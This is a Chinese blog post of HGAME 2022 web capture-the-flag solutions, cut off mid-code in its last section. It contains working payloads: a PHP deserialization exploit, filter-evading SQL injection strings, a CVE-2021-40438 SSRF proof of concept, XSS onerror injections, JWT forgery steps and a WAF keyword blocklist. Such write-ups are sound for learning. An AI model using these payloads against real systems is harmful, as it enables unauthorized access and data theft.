<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HGAME-Web"><meta name="keywords" content=""><meta name="author" content="wuyusanhua"><meta name="copyright" content="wuyusanhua"><title>HGAME-Web | 雾雨散花</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="雾雨散花" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9B%9B%E8%9B%9B"><span class="toc-number">1.</span> <span class="toc-text">蛛蛛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tetris-plus"><span class="toc-number">2.</span> <span class="toc-text">Tetris plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%8B%E5%90%8D%E5%B1%B1"><span class="toc-number">3.</span> <span class="toc-text">秋名山</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-auth"><span class="toc-number">4.</span> <span class="toc-text">ez_auth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Webpack-Engine"><span class="toc-number">5.</span> <span class="toc-text">Webpack Engine</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%9C%AC%E5%8D%95%E8%AF%8D%E4%B9%A6"><span class="toc-number">6.</span> <span class="toc-text">一本单词书</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pokemon"><span class="toc-number">7.</span> <span class="toc-text">Pokemon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache"><span class="toc-number">8.</span> <span class="toc-text">Apache!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#At0m%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-number">9.</span> <span class="toc-text">At0m的留言板</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Center"><span class="toc-number">10.</span> <span class="toc-text">Security Center</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vider-shop-Demo"><span class="toc-number">11.</span> <span class="toc-text">Vider shop Demo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LoginMe"><span class="toc-number">12.</span> <span class="toc-text">LoginMe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Markdown-Online"><span class="toc-number">13.</span> <span class="toc-text">Markdown Online</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Comment"><span class="toc-number">14.</span> <span class="toc-text">Comment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FileSystem"><span class="toc-number">15.</span> <span class="toc-text">FileSystem</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">wuyusanhua</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">17</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://www.socwall.com/images/wallpapers/98278-5120x2880.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">雾雨散花</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">HGAME-Web</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-12</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="蛛蛛"><a href="#蛛蛛" class="headerlink" title="蛛蛛"></a>蛛蛛</h1><p>简单爬虫，脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&quot;https://hgame-spider.vidar.club/e109015477/&quot;</span></span><br><span class="line">cur = url</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(cur)</span><br><span class="line">    key = re.search(<span class="string">r&#x27;\?key=(.*)%3D%3D&#x27;</span>, r.text)</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cur = url + key.group()</span><br><span class="line"><span class="built_in">print</span>(cur)</span><br></pre></td></tr></table></figure>

<p>抓包，在response报文处即可找到flag</p>
<p><img src="/2022/02/12/hgame-wp/image-20220121120346224.png" alt="image-20220121120346224"></p>
<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h1><p>f12-&gt;网络-&gt;ctrl+R，checking.js里面有jsfuck，粘贴到控制台直接输出flag</p>
<p><img src="/2022/02/12/hgame-wp/image-20220121135219197.png" alt="image-20220121135219197"></p>
<h1 id="秋名山"><a href="#秋名山" class="headerlink" title="秋名山"></a>秋名山</h1><p>抓包，根据提示在文件头添加：<code>Referer: qiumingshan.net</code>，得</p>
<p><img src="/2022/02/12/hgame-wp/image-20220121141643941.png" alt="image-20220121141643941"></p>
<p>修改User-Agent为：<code>User-Agent: Hachi-Roku</code></p>
<p><img src="/2022/02/12/hgame-wp/image-20220121142643859.png" alt="image-20220121142643859"></p>
<p>添加：<code>Cookie: flavor=Raspberry</code></p>
<p><img src="/2022/02/12/hgame-wp/image-20220121143112321.png" alt="image-20220121143112321"></p>
<p>添加：<code>gasoline: 100</code></p>
<p><img src="/2022/02/12/hgame-wp/image-20220121143220216.png" alt="image-20220121143220216"></p>
<p>最后加上：<code>x-real-ip: 127.0.0.1</code></p>
<p><img src="/2022/02/12/hgame-wp/image-20220121143314194.png" alt="image-20220121143314194"></p>
<h1 id="ez-auth"><a href="#ez-auth" class="headerlink" title="ez_auth"></a>ez_auth</h1><p>注册账户登录，f12找到token</p>
<p><img src="/2022/02/12/hgame-wp/image-20220212211617298.png" alt="image-20220212211617298"></p>
<p>token放到jwt.io解密，修改username,id为admin,1，并删去secret，得到伪造的token，使用伪造的token登录即可得到flag</p>
<p><img src="/2022/02/12/hgame-wp/image-20220212212506933.png" alt="image-20220212212506933"></p>
<h1 id="Webpack-Engine"><a href="#Webpack-Engine" class="headerlink" title="Webpack Engine"></a>Webpack Engine</h1><p>f12，在F14g_1s_her3.vue中得flag，两次base64解密即可</p>
<p><img src="/2022/02/12/hgame-wp/image-20220212215042090.png" alt="image-20220212215042090"></p>
<h1 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h1><p><code>www.zip</code>源码泄露，登录验证相关代码如下，密码为php弱类型绕过，令password=1080a即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;adm1n&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;username or password is invalid&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(alert(<span class="string">&#x27;密码不能设置为纯数字，我妈都知道(￣△￣；)&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="number">1080</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;unique_key&#x27;</span>] = md5(randomString(<span class="number">8</span>));</span><br><span class="line">            header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(alert(<span class="string">&#x27;这你都能输错？&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>审计源码，save.php将用户的输入组合为<code>key | value</code>三部分存储，get.php提示flag在/flag，并且decode()函数中会对<code>key | value</code>重新进行拆分，具体实现代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$data</span></span>): <span class="title">Array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="variable">$offset</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$length</span> = \strlen(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$offset</span> &lt; <span class="variable">$length</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strstr(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>), <span class="string">&#x27;|&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$data</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$offset</span>);</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$pos</span> - <span class="variable">$offset</span>;</span><br><span class="line">        <span class="variable">$varname</span> = substr(<span class="variable">$data</span>, <span class="variable">$offset</span>, <span class="variable">$num</span>);</span><br><span class="line">        <span class="variable">$offset</span> += <span class="variable">$num</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$dataItem</span> = unserialize(substr(<span class="variable">$data</span>, <span class="variable">$offset</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>[<span class="variable">$varname</span>] = <span class="variable">$dataItem</span>;</span><br><span class="line">        <span class="variable">$offset</span> += \strlen(serialize(<span class="variable">$dataItem</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要将key的部分改造成<code>key1 | key2</code>就可以利用unserialize，魔术方法已在Evil类中给出，$file可控，可以实现任意文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/hgame/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> Evil();</span><br><span class="line"><span class="variable">$payload</span>-&gt;file = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;a|&#x27;</span>.serialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成payload输入即可得到flag</p>
<h1 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h1><p>网页源码提示<code>/index.php?id=1</code>，当输入id为4就跳转到<code>error.php?code=404</code>，code就是注入点，空格,=以及部分关键词被过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查字段数:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>oorrder<span class="comment">/*1*/</span><span class="keyword">by</span><span class="comment">/*1*/</span><span class="number">2</span>#</span><br><span class="line"></span><br><span class="line">查库名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>ununionion<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,database()#</span><br><span class="line"></span><br><span class="line">查表名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.tables<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_schema<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;pokemon&quot;#</span><br><span class="line"></span><br><span class="line">查列名:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>infoorrmation_schema.columns<span class="comment">/*1*/</span>whewherere<span class="comment">/*1*/</span>table_name<span class="comment">/*1*/</span><span class="keyword">like</span><span class="comment">/*1*/</span>&quot;fllllllllaaaaaag&quot;#</span><br><span class="line"></span><br><span class="line">查flag:code<span class="operator">=</span><span class="number">404</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>selselectect<span class="comment">/*1*/</span><span class="number">1</span>,group_concat(flag)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>pokemon.fllllllllaaaaaag#</span><br></pre></td></tr></table></figure>

<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h1><p>复现的时候环境已经无了</p>
<p>本题的考点是<code>cve-2021-40438</code>，适用范围Apache&lt;=2.4.49，漏洞原理为：</p>
<blockquote>
<p>利用apache函数缺陷，构造可控的反向代理：Apache在正常情况下，因为识别到了unix套接字，所以会把用户请求发送给这个本地文件套接字，而不是后端URL。使unix套接字过长，就会返回空，请求就会发送给后端的url。具体说明：当远程在目标环境（服务器）使用了mod_proxy做反向代理，比如ProxyPass /  “<a target="_blank" rel="noopener" href="http://localhost:8000/&quot;%EF%BC%8C%E6%AD%A4%E6%97%B6%E9%80%9A%E8%BF%87%E8%AF%B7%E6%B1%82http://target/?unix:%7B&#39;A&#39;*5000}|http://example.com/%E5%8D%B3%E5%8F%AF%E5%90%91**http://%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9C%B0%E5%9D%80%E6%88%96%E8%87%AA%E5%B7%B1%E5%8F%AF%E6%8E%A7%E7%9A%84%E7%BD%91%E7%AB%99.com**%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%EF%BC%88%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%B0%B1%E6%98%AF%E4%BB%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E8%B5%B7%E7%9A%84%E5%90%91%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%89%EF%BC%8C%E9%80%A0%E6%88%90%E4%B8%80%E4%B8%AASSRF%E6%94%BB%E5%87%BB%E3%80%82">http://localhost:8000/&quot;，此时通过请求http://target/?unix:{&#39;A&#39;*5000}|http://example.com/即可向**http://自己的地址或自己可控的网站.com**发送请求（这个请求就是从服务端发起的向自己的请求），造成一个SSRF攻击。</a></p>
</blockquote>
<p>poc为<code>http://target/?unix:&#123;&#39;A&#39;*5000&#125;|http://example.com/</code>，若不使用Apache作为代理服务器，则需要加上代理服务器</p>
<h1 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h1><p>hint:<br> 1.留言板正在尝试图片留言的兼容性测试<br> 2.flag的名字被改了</p>
<p>留言板网页源码就有暗示，看了官方wp才知道</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">	<span class="keyword">let</span> auth0r = <span class="string">&#x27;at0m&#x27;</span>;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> flag = <span class="string">&#x27;hgame&#123;xxx&#125;&#x27;</span>;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用var定义的flag是全局变量，可以用Object.key(window)查看flag的变量名</p>
<p>根据hint1有<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = Object.key(window)&quot;&gt;</code></p>
<p>得到flag变量名F149_is_Here</p>
<p>接下来直接查看它<code>&lt;img src=x.png onerror=&quot;document.getEmploymentsByClassName(&#39;content&#39;)[0].innerText = &quot;F149_is_Here&quot;&gt;</code></p>
<h1 id="Security-Center"><a href="#Security-Center" class="headerlink" title="Security Center"></a>Security Center</h1><p>网页源码有提示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hint: /vendor/composer/installed.json --&gt;</span></span><br></pre></td></tr></table></figure>

<p>转去该页面得关键信息：网站使用twig3.3.7模版</p>
<p><img src="/2022/02/12/hgame-wp/image-20220212233024313.png" alt="image-20220212233024313"></p>
<p>回到首页点击跳转链接，来到<code>redirect.php?url=URL</code>，经过测试url就是模板注入点</p>
<p>网上找到相关payload，cat,tac命令被过滤，可以写webshell，也可以base64命令直接输出flag</p>
<h1 id="Vider-shop-Demo"><a href="#Vider-shop-Demo" class="headerlink" title="Vider shop Demo"></a>Vider shop Demo</h1><p>环境也无了，比赛时的思路很简单，10000元可以买flag，但是账户里只有9999元，同时购物车里有一些订单，支付会扣除相应的金额，撤销支付也会返回支付的金额，新建一个订单，点之前已有的订单退款，抓包，把新建订单的id输入，放包，账户余额就会超过10000，买flag付款即可，但week3的官方wp给出的解法是条件竞争，之后一定学学条件竞争</p>
<h1 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h1><p>第一次遇到非MySQL的sql注入题，用的是SQLite，有一篇总结SQLite注入的<a target="_blank" rel="noopener" href="https://lanvnal.com/2020/12/08/sqlite-zhu-ru-de-yi-dian-zong-jie/">博客</a></p>
<p>题目使用sqlmap的<code>--data </code>命令能一把梭，爆出admin密码，然后登录admin用户就能得到flag，分析一下sqlmap生成的盲注文件</p>
<p>随机抽取一个payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;test&#x27;) AND SUBSTR((SELECT COALESCE(sql,CHAR(32)) FROM sqlite_master WHERE tbl_name=CHAR(117,117,117,115,115,115,101,101,101,114,114,114,115,115,115) LIMIT 1),1,1)=CHAR(117) AND (&#x27;Hxna&#x27;=&#x27;Hxna&quot;,&quot;password&quot;:&quot;test&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这里是在爆列名，其中用到了一个函数COALESCE()，查了一下资料，SqlServer/MySql/Oracle/PostgreSql/Sqlite均支持该函数，用法如下：</p>
<p><img src="/2022/02/12/hgame-wp/image-20220213205858681.png" alt="image-20220213205858681"></p>
<p>所以语句的意思就是判断创建uuussseeerrr表的<code>sql</code>语句的第n个字符是否符合条件，是则返回该字符，否则返回char(32)，盲注脚本就很好反推了：二分查找，返回char(32)就break，返回其它值就添加到result。又get了一种用coalesce的盲注方式</p>
<h1 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h1><p>controller.js里有关于登录验证的代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.body.username === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.body.password.length === <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            req.body.password = req.body.password.toUpperCase()</span><br><span class="line">            <span class="keyword">if</span> (req.body.password !== <span class="string">&#x27;54gkj7n8uo55vbo2&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> res.status(<span class="number">403</span>).json(&#123;<span class="attr">msg</span>: <span class="string">&#x27;invalid username or password&#x27;</span>&#125;)</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure>

<p>用数组绕过长度验证，发包得到cookie</p>
<p><img src="/2022/02/12/hgame-wp/image-20220218162700441.png" alt="image-20220218162700441"></p>
<p>接下来进入<code>/md</code>路由，有<code>preview</code>,<code>submit</code>按钮，继续审计controller.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = <span class="regexp">/__proto__|prototype|\+|alert|confirm|escape|parseInt|parseFloat|prompt|isNaN|new|this|process|constructor|atob|btoa|apk/i</span></span><br><span class="line">    <span class="keyword">if</span> (code.match(blacklist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;# Hacker!&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubmitController</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.code &amp;&amp; <span class="keyword">typeof</span> req.body.code === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = waf(req.body.code)</span><br><span class="line">        <span class="keyword">const</span> source = md.render(code)</span><br><span class="line">        <span class="keyword">const</span> browser = <span class="keyword">new</span> Browser()</span><br><span class="line">        browser.load(source, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> source = hljs.highlight(browser.html(), &#123;<span class="attr">language</span>: <span class="string">&quot;html&quot;</span>&#125;).value</span><br><span class="line">            res.json(&#123;source&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.status(<span class="number">500</span>).send(<span class="string">&quot;code is required&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把code用waf过滤一次，再进行md渲染，跟进browser.load()，browzer导入了zombie，查看zombie中的load()</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">load</span>(<span class="params">html, callback</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.window)</span><br><span class="line">      <span class="built_in">this</span>.tabs.close(<span class="built_in">this</span>.window);</span><br><span class="line">    <span class="built_in">this</span>.errors = [];</span><br><span class="line">    <span class="built_in">this</span>.tabs.open(&#123; <span class="attr">html</span>: html &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._wait(<span class="literal">null</span>, callback);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>调用了this.tabs.open()，跟进</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">open</span>(<span class="params">options = &#123;&#125;</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> named = options.name &amp;&amp; <span class="built_in">this</span>.find(options.name.toString());</span><br><span class="line">    <span class="keyword">if</span> (named) &#123;</span><br><span class="line">      <span class="built_in">this</span>._current = named;</span><br><span class="line">      <span class="keyword">if</span> (options.url)</span><br><span class="line">        <span class="built_in">this</span>._current.location = options.url;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>._current;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> active = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">const</span> open = createHistory(<span class="built_in">this</span>._browser, <span class="function">(<span class="params"><span class="built_in">window</span></span>)=&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!Tabs.sameWindow(<span class="built_in">window</span>, active)) 